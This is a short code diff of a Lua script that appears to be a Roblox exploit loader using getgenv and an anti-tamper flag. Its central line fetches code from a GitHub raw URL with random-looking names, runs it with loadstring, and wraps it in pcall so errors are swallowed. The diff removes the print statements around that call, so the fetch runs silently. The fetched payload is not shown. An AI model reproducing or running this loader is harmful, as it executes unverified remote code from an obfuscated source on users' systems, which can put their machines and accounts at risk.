@@ -1,8 +1,7 @@
-print("<?>")
 pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/u20d30a0298t8g983020z020/u20d30a0298t8g983020z020/refs/heads/main/u20d30a0298t8g9ff02039"))()
-print("</>")
 end)
+
 local AntiTamperEnv = getgenv()
 if AntiTamperEnv.valary_loaded then
     return
